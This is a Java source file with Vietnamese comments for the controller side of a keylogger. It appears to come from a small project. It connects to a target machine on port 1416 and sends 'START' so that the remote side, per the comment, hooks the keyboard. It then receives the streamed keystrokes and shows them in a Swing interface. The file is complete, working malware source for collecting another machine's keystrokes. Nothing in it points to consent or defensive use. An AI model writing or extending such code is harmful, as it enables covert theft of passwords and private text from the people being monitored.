package network;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import javax.swing.SwingUtilities;
import ui.UIKeylogger;

public class KeyloggerClient {

    private final String clientIp;
    private final int port;
    private final UIKeylogger ui;

    private Socket socket;
    private volatile boolean running = false;

    public KeyloggerClient(String clientIp, UIKeylogger ui) {
        this.clientIp = clientIp;
        this.port     = 1416;
        this.ui       = ui;
    }

    public KeyloggerClient(String clientIp, int port, UIKeylogger ui) {
        this.clientIp = clientIp;
        this.port     = port;
        this.ui       = ui;
    }

    public void start() {
        if(running) return;
        running = true;

        new Thread(() -> {
            try {
                socket = new Socket(clientIp, port);
                DataOutputStream dos = new DataOutputStream(socket.getOutputStream());
                DataInputStream  dis = new DataInputStream(socket.getInputStream());

                // Gửi lệnh START → client bắt đầu hook và gửi phím
                dos.writeUTF("START");
                dos.flush();

                System.out.println("[KEYLOGGER] Đã kết nối tới " + clientIp + ":" + port);

                while (running && !socket.isClosed()) {
                    int len = dis.readInt();
                    byte[] bytes = new byte[len];
                    dis.readFully(bytes);
                    String key = new String(bytes, "UTF-8");

                    SwingUtilities.invokeLater(() -> ui.appendKey(key));
                }

            } catch (Exception e) {
                if (running) {
                    System.out.println("[KEYLOGGER] Mất kết nối: " + e.getMessage());
                }
            }
        }, "KeyloggerClient-" + clientIp).start();
    }

    public void stop() {
        running = false;
        try {
            if (socket != null && !socket.isClosed()) {
                socket.close();
            }
        } catch (Exception ignored) {}
    }

    public boolean isRunning() {
        return running;
    }
}